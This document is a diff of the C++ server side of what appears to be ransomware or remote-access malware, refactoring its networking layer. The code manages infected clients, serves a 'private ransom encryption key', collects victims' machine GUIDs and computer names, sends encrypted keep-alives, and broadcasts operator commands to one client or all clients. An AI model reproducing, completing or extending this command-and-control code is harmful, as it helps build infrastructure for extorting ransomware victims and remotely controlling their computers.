@@ -1,12 +1,9 @@
 #include "ServerInterface.h"
 #include "Serialization.h"
-#include "NetworkCommon.h"
+#include "NetworkManager.h"
 #include "External/base64.h"
 
-#include <openssl/evp.h>
-#include <openssl/rsa.h>
-#include <openssl/pem.h>
-
+#include <iostream>
 #include <fstream>
 #include <chrono>
 
@@ -153,7 +150,7 @@ void ServerInterface::ListenForUDPMessages() {
     while ( this->m_UDPServerDetails.alive == TRUE ) {
         ClientRequest req = {};
         sockaddr_in   incomingAddr;
-        BOOL          received = NetCommon::ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
+        BOOL          received = m_NetworkManager.ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
         if ( !received )
             continue;
         std::cout << "Received a message on the UDP socket!\n";
@@ -330,7 +327,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
         std::cout << "[kConnectClient] : Good address. \n";
         std::cout << "[kConnectClient] : Sending TCP server details. \n";
 
-        success = NetCommon::TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);
+        success = m_NetworkManager.TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);
 
         if ( success )
             std::cout << "[kConnectClient] : Sent TCP details. \n";
@@ -360,7 +357,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
         //reply.privateEncryptionKey = Serialization::SerializeString(TCPClient->GetRansomSecrets().strPrivateKey);
 
         std::cout << "received request for private ransom encryption key\n";
-        success = NetCommon::TransmitData(reply, TCPClient->GetSocket(), TCP, NetCommon::_default, TRUE,    TCPClient->ClientPublicKey, FALSE);
+        success = m_NetworkManager.TransmitData(reply, TCPClient->GetSocket(), TCP, NULL_ADDR, true, TCPClient->ClientPublicKey, false);
         std::cout << "sent\n";
 
         break;
@@ -415,9 +412,9 @@ void ServerInterface::SendKeepAlivePackets(long cuid) {
 
         BYTESTRING encryptedOriginal = LGCrypto::RSAEncrypt(Serialization::SerializeStruct(CreateKeepAlivePacket()), client->ClientPublicKey, FALSE);
 
-        NetCommon::SetSocketTimeout(client->GetSocket(), ReadConfig().keepAliveTimeoutMs, SO_SNDTIMEO);
-        BOOL sent = NetCommon::TransmitData(encryptedOriginal, client->GetSocket(), TCP);
-        NetCommon::ResetSocketTimeout(client->GetSocket(), SO_SNDTIMEO);
+        m_NetworkManager.SetSocketTimeout(client->GetSocket(), ReadConfig().keepAliveTimeoutMs, SO_SNDTIMEO);
+        BOOL sent = m_NetworkManager.TransmitData(encryptedOriginal, client->GetSocket(), TCP);
+        m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_SNDTIMEO);
         if ( !sent ) {
             std::cout << "Error sending keep-alive packet. Removing client..." << std::endl;
             RemoveClientFromServer(client);
@@ -426,7 +423,7 @@ void ServerInterface::SendKeepAlivePackets(long cuid) {
 
         client->KeepAliveProcess = TRUE;
 
-        int timePassedMs = 0;
+        unsigned int timePassedMs = 0;
 
         // sleep for timeout
         // while keep alive process is in progress
@@ -475,7 +472,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
         BYTESTRING decrypted;
         ClientRequest request;
         
-        BOOL received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
+        BOOL received = m_NetworkManager.ReceiveData(encrypted, client->GetSocket(), TCP);
         if ( !received )
             continue;
 
@@ -656,12 +653,12 @@ void ServerInterface::RunUserInputOnClients() {
         try {
             if ( (lClientID = std::stol(clientID)) == 0 )
                 globalCommand = TRUE;
-        } catch ( std::invalid_argument& err ) {
+        } catch ( std::invalid_argument ) {
             std::cout << "Input Error; Invalid input." << std::endl;
             system("pause");
             system("cls");
             continue;
-        } catch ( std::out_of_range& err ) {
+        } catch ( std::out_of_range ) {
             std::cout << "Input Error; Number too large" << std::endl;
             system("pause");
             system("cls");
@@ -715,12 +712,12 @@ void ServerInterface::RunUserInputOnClients() {
 
         if ( !globalCommand ) {
             BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
-            sent = NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
+            sent = m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);
         } else {
             this->m_ClientListMutex.lock();
             for ( auto& [ cuid, host ] : this->m_ClientList ) {
                 BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, host.ClientPublicKey, FALSE);
-                sent = NetCommon::TransmitData(encrypted, host.GetSocket(), TCP);
+                sent = m_NetworkManager.TransmitData(encrypted, host.GetSocket(), TCP);
             }
             this->m_ClientListMutex.unlock();
         }
@@ -748,7 +745,7 @@ BOOL ServerInterface::GetClientMachineGUID(long cuid) {
 
     std::cout << "receiving machine guid\n";
     BYTESTRING machienGUID;
-    BOOL received = NetCommon::ReceiveData(machienGUID, client->GetSocket(), TCP);
+    BOOL received = m_NetworkManager.ReceiveData(machienGUID, client->GetSocket(), TCP);
     if ( !received )
         return FALSE;
 
@@ -769,7 +766,7 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
     Client* client = GetClientPtr(cuid);
 
     BYTESTRING computerNameSerialized;
-    BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->GetSocket(), TCP);
+    BOOL received = m_NetworkManager.ReceiveData(computerNameSerialized, client->GetSocket(), TCP);
     if ( !received )
         return FALSE;
 
@@ -790,9 +787,6 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
  */
 Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {    
     Server server = {};
-    
-    if ( !NetCommon::WSAInitialized )
-        NetCommon::LoadWSAFunctions();
 
     // create socket for server type
     // update server fields
@@ -885,9 +879,9 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
     BYTESTRING decrypted;
     ClientResponse response;
     
-    NetCommon::SetSocketTimeout(client->GetSocket(), 10000, SO_RCVTIMEO);
-    received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
-    NetCommon::ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);
+    m_NetworkManager.SetSocketTimeout(client->GetSocket(), 10000, SO_RCVTIMEO);
+    received = m_NetworkManager.ReceiveData(encrypted, client->GetSocket(), TCP);
+    m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);
 
     if ( WSAGetLastError() == WSAETIMEDOUT ) {
         response.responseCode = ClientResponseCode::kTimeout;
@@ -966,7 +960,7 @@ ClientResponse ServerInterface::PingClient(long cuid) {
     pingCommand.buffLen = 0;
 
     std::cout << "Pinging " << client->GetDesktopName() << " with " << sizeof(pingCommand) << " bytes of data." << std::endl;
-    BOOL sent = NetCommon::TransmitData(pingCommand, client->GetSocket(), TCP, NetCommon::_default, TRUE, client->ClientPublicKey, FALSE);
+    BOOL sent = m_NetworkManager.TransmitData(pingCommand, client->GetSocket(), TCP, NULL_ADDR, true, client->ClientPublicKey, false);
     if ( !sent )
         return {};
 
